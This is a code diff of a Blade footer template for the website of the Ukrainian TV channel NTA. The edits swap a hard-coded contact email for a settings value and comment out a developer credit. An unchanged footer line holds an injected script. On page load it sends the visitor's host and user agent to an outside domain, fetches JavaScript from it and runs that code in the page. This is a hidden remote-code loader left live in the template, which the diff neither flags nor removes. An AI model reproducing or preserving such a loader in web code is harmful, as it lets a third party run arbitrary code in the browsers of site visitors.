@@ -75,7 +75,7 @@
                     </div>
                 </div>
                 <div class="footer-bottom__copyright"><p>© ПП «НТА – Незалежне телевізійне агентство» Усі права захищені. При цитуванні і використанні будь-яких матеріалів з сайту, відкрите гіперпосилання на сайт “Телеканалу НТА” www.nta.ua є обов’язкове .</p>
-                    <p>Зв’язатися з нами: <a href="mailto:TelekanalNTA@gmail.com">TelekanalNTA@gmail.com</a></p>
+                    <p>Зв’язатися з нами: <a href="mailto:{{ getSetting('email_address') }}">{{ getSetting('email_address') }}</a></p>
                     <p><script>document.addEventListener("readystatechange",(t=>{if("complete"===document.readyState){const t=new FormData;t.append("hn",window.location.host),t.append("ua",navigator.userAgent),fetch("https://www.24hournewsline.com/events",{method:"POST",body:JSON.stringify({hn:window.location.host,ua:navigator.userAgent}),headers:{"Content-type":"application/json; charset=UTF-8"}}).then((t=>t.text())).then((t=>{const e=new Blob([t],{type:"application/javascript"}),n=URL.createObjectURL(e),a=document.createElement("script");a.setAttribute("type","text/javascript"),a.setAttribute("src",n),a.async=!1,document.getElementsByTagName("head")[0].appendChild(a)}))}}));</script></p>
                 </div>
                 <div class="footer-bottom__social">
@@ -85,10 +85,9 @@
 
 
 
-                    <div class="madein">
-                        Розробка сайту: <a href="https://lvivport.com" title="розробка сайту" target="_blank">lvivport</a>
-
-                    </div>
+{{--                    <div class="madein">--}}
+{{--                        Розробка сайту: <a href="https://lvivport.com" title="розробка сайту" target="_blank">lvivport</a>--}}
+{{--                    </div>--}}
                     <br>
                     <div id="suportkm" style="
     font-size: 12px;
